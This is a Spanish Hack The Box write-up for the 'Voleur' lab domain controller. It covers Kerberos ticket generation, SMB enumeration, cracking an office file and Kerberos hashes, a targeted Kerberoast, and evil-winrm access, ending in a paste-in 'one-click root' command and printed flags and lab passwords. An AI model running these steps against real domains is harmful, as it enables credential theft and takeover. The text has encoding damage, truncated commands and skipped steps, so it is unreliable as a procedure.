Hack The Box - Informe de Voleur de HTB - Medium - Semanal de la Temporada 8 - 5 de julio de 2025
    En el reino de VOLEUR.HTB, el buscador maneja tickets Kerberos y un reconocimiento Ã¡gil como un maestro zen, 
revelando claves ocultas y susurros de cuentas de servicio. Cada paso â€”un ataque consciente contra las sombras 
digitalesâ€” revela el arte de convertir las vulnerabilidades en un camino de iluminaciÃ³n estructurada.

Autor
Irioshi | Security+ CE

    Hola, soy Irioshi. Me encargo de explicar los CVE para que usted no tenga que hacerlo. 
Creo contenido que facilita el acceso a la ciberseguridad a estudiantes, desarrolladores y 
personas curiosas. Con dos aÃ±os de experiencia prÃ¡ctica, me apasiona hacer que la ciberseguridad 
sea clara, prÃ¡ctica y accesible.
Publicado el
06/07/2025


IP

10.10.11.76


Domain/Hosts

dc.voleur.htb VOLEUR.HTB

â”Œâ”€â”€(soloã‰¿sola)-[/etc]
â””â”€$ cat krb5.conf      
[libdefaults]
default_realm = VOLEUR.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
VOLEUR.HTB = {
 kdc = 10.10.11.76
 admin_server = 10.10.11.76
 default_domain = voleur.htb
}

[domain_realm]
.voleur.htb = VOLEUR.HTB
voleur.htb = VOLEUR.HTB



Comenzaremos con las credenciales predeterminadas: ryan.naylor | HollowOct31Nyt en lugar de tener que rociarlas con contraseÃ±a de los sectarios.



nmapeamos

â”Œâ”€â”€(soloã‰¿sola)-[~/HTB/Voleur]
â””â”€$ nmap -sC -sV -p- --min-rate=5000 10.10.11.76
Starting Nmap 7.95 ( https://nmap.org ) at 2025-07-07 06:43 -03
Nmap scan report for dc.voleur.htb (10.10.11.76)
Host is up (0.37s latency).
Not shown: 65514 filtered tcp ports (no-response)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-07-07 09:4>
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.>
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
2222/tcp  open  ssh           OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol>
| ssh-hostkey:
|   3072 42:40:39:30:d6:fc:44:95:37:e1:9b:88:0b:a2:d7:71 (RSA)
|   256 ae:d9:c2:b8:7d:65:6f:58:c8:f4:ae:4f:e4:e8:cd:94 (ECDSA)
|_  256 53:ad:6b:6c:ca:ae:1b:40:44:71:52:95:29:b1:bb:c1 (ED25519)
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: voleur.>
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49664/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
50487/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
50488/tcp open  msrpc         Microsoft Windows RPC
50490/tcp open  msrpc         Microsoft Windows RPC
50518/tcp open  msrpc         Microsoft Windows RPC
54802/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OSs: Windows, Linux; CPE: cpe:/o:microsoft:windows, cpe:/o:lin>

Host script results:
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: -42s
| smb2-time:
|   date: 2025-07-07T09:45:04
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/s>
Nmap done: 1 IP address (1 host up) scanned in 156.56 seconds

â”Œâ”€â”€(soloã‰¿sola)-[~/HTB/Voleur]
â””â”€$ echo "10.10.11.76 dc.voleur.htb voleur.htb" | sudo tee -a /etc/hosts


EnumeraciÃ³n SMB

Generamos un TGT de Kerberos para el usuario Ryan Naylor mediante netexec con autenticaciÃ³n de contraseÃ±a.

netexec smb DC.VOLEUR.HTB -u ryan.naylor -p 'HollowOct31Nyt' -k --generate-tgt ryan.naylor

Configuraremos la variable de entorno de cachÃ© de tickets de Kerberos para utilizar el TGT de Ryan Naylor

export KRB5CCNAME=ryan.naylor.ccache

Verify the current Kerberos ticket

klist

Enumeraremos los recursos compartidos SMB disponibles en DC.VOLEUR.HTB usando netexec con autenticaciÃ³n Kerberos

netexec smb DC.VOLEUR.HTB -u ryan.naylor -p 'HollowOct31Nyt' -k --shares

We get some interessting Shares

Nos conectaremos a DC.VOLEUR.HTB usando smbclient.py con autenticaciÃ³n de ticket Kerberos

KRB5CCNAME=ryan.naylor.ccache smbclient.py -k DC.VOLEUR.HTB

 use IT
 cd First-Line Support
 get Access_Review.xlsx

Creds en Access_Review.xls

El archivo Access_Review.xlsx estÃ¡ protegido con contraseÃ±a.
Extraeremos el hash de la contraseÃ±a de Access_Review.xlsx con office2john y lo guardaremos en hash.txt.

office2john Access_Review.xlsx >> hash.txt

crakeamos con rockyou

john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt

Password is: football1

No queremos ejecutar msoffcrypto-tool y configurar un venv de Python

python3 -m venv venv
 source venv/bin/activate
 pip install msoffcrypto-tool
 cd /mnt/NASDF017E/#Kali/HTB/Voleur_HTB
 python3 -m msoffcrypto -p football1 Access_Review.xlsx entschluesselt_Access_Review.xlsx



Abra la hoja en https://jumpshare.com/viewer/xlsx o Libreoffice

ContraseÃ±as de cuentas de servicio en Access_Review.xls

   User  | Password
svc_ldap | M1XyC9pW7qT5Vn
svc_iis  | N5pXyV1WqM7CZ8


Hay un indicio de que el usuario eliminado Todd.Wolfe tenÃ­a la contraseÃ±a NightT1meP1dg3on14

Cadena de ataque

Ejecutar bloodhound-python con las credenciales de Ryan Naylor para recopilar todos los datos 
de Active Directory del dominio VOLEUR.HTB mediante Kerberos y generar un informe comprimido.

boodhound-python -u ryan.naylor -p 'HollowOct31Nyt' -c All -d VOLEUR.HTB -ns 10.129.71.253--zip -k

svc_ldap tiene GenericWrite en lacey.miller y WriteSPN en svc_winrm

Generaremos un TGT de Kerberos para svc_ldap en DC.VOLEUR.HTB usando netexec con autenticaciÃ³n de contraseÃ±a

netexec smb DC.VOLEUR.HTB -u svc_ldap -p 'M1XyC9pW7qT5Vn' -k --generate-tgt svc_ldap

Configuraremos la variable de entorno de cachÃ© de tickets de Kerberos para utilizar el TGT de svc_ldap

export KRB5CCNAME=svc_ldap.ccache

Realizaremos un ataque Kerberoast dirigido utilizando la cuenta svc_ldap con autenticaciÃ³n Kerberos contra dc.voleur.htb

targetedKerberoast.py -k --dc-host dc.voleur.htb -u svc_ldap -d voleur.htb

Descifraremos hashes de contraseÃ±as de Kerberos usando John the Ripper con la lista de palabras RockYou

john --wordlist=/usr/share/wordlists/rockyou.txt hashes_kerberos.txt

SÃ³lo se puede descifrar el hash de svc_winrm

Generaremos un TGT de Kerberos para svc_winrm en DC.VOLEUR.HTB usando netexec con autenticaciÃ³n de contraseÃ±a

netexec smb DC.VOLEUR.HTB -u svc_winrm -p 'AFireInsidedeOzarctica980219afi' -k --generate-tgt
 svc_winrm

Configuraremos la variable de entorno de cachÃ© de tickets de Kerberos para utilizar el TGT de svc_winrm

export KRB5CCNAME=svc_winrm.ccache

Nos conectaremos a dc.voleur.htb usando evil-winrm con autenticaciÃ³n Kerberos como svc_winrm

evil-winrm -i dc.voleur.htb -k -u svc_winrm -r VOLEUR.HTB

User Flag

And we got the user flag!

User Flag

And we got the user flag!

type C:\Users\svc_winrm\Desktop\user.txt






Voleur the fast way  with skipping steps.
1 click root  bash (works for me perhaps for you to, but you learn less if >
If it does not work please do the whole thing! That is better anyways.

just copy past in terminal and do not forget to pres enter ðŸ™‚

echo "10.10.11.76 dc.voleur.htb VOLEUR.HTB" | sudo tee -a /etc/hosts && \
sudo cp /etc/krb5.conf /etc/krb5.conf.bak && \
echo "[libdefaults]
default_realm = VOLEUR.HTB
dns_lookup_realm = false
dns_lookup_kdc = false
ticket_lifetime = 24h
renew_lifetime = 7d
forwardable = true

[realms]
VOLEUR.HTB = {
 kdc = 10.10.11.76
 admin_server = 10.10.11.76
 default_domain = voleur.htb
}

[domain_realm]
.voleur.htb = VOLEUR.HTB
voleur.htb = VOLEUR.HTB" | sudo tee /etc/krb5.conf && \
sudo timedatectl set-ntp 0 && sudo rdate -n 10.10.11.76 && \
python3 /usr/share/doc/python3-impacket/examples/getTGT.py -dc-ip 10.10.11.>
export KRB5CCNAME=$(pwd)/administrator.ccache && \
evil-winrm -i dc.voleur.htb -k -u administrator -r VOLEUR.HTB


*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
95dbb03a9bd57d472d0c5b20237c6695


